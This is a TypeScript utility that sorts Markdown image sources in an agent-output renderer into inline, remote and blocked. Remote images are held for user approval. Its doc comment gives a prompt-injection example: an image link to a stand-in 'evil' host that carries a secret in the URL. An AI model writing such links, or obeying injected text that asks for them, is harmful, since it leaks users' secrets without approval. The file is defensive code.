/**
 * Where a Markdown image comes from, which decides whether it may load by itself. An agent's text is untrusted (a
 * prompt injection can write `![](https://evil/?d=<secret>)`), and fetching a remote image sends its URL out with no
 * approval, so a remote image waits for the person's "Load image" (security review 4b). Images inline in the text
 * (`data:image/…`, `blob:`) and paths local to the app render as before; any other scheme never loads.
 */
export type ImageSource = { kind: "inline" } | { kind: "remote"; host: string } | { kind: "blocked" };

const SCHEME = /^[a-z][a-z0-9+.-]*:/i;

export function imageSource(src: string | undefined): ImageSource {
  const s = (src ?? "").trim();
  if (!s) return { kind: "blocked" };
  if (/^data:image\//i.test(s) || /^blob:/i.test(s)) return { kind: "inline" };
  if (/^(https?:)?\/\//i.test(s)) {
    try {
      const host = new URL(s.startsWith("//") ? `https:${s}` : s).host;
      return host ? { kind: "remote", host } : { kind: "blocked" };
    } catch {
      return { kind: "blocked" };
    }
  }
  return SCHEME.test(s) ? { kind: "blocked" } : { kind: "inline" };
}
